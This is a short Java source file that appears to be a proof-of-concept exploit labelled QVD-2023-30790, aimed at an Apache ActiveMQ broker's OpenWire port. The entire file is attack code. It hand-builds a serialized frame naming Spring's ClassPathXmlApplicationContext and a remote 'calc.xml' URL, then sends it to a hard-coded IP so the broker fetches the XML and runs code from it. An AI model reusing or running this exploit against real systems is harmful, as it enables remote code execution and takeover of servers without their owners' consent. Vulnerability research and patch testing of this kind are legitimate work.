package cve;

import java.io.*;
import java.net.Socket;

public class QVD_2023_30790 {

    public static void main(String[] args) throws IOException {

        Socket socket =new Socket("10.58.120.201",61616);
        DataOutputStream out = null;
        DataInputStream in = null;
        out = new DataOutputStream(new BufferedOutputStream(new
                FileOutputStream("test.txt")));
        out.writeInt(40);
        out.writeByte(31);
        out.writeInt(1);
        out.writeBoolean(true);
        out.writeInt(1);
        out.writeBoolean(true);
        out.writeBoolean(true);
        out.writeUTF("org.springframework.context.support.ClassPathXmlApplicationContext");
        out.writeBoolean(true);
        out.writeUTF("http://127.0.0.1/calc.xml");
        out.close();

        in = new DataInputStream(new BufferedInputStream(new
                FileInputStream("test.txt")));
        OutputStream os = socket.getOutputStream(); //输出流
        int length = in.available();
        byte[] buf = new byte[length];
        in.readFully(buf);
        os.write(buf);
        in.close();
        socket.close();
    }
}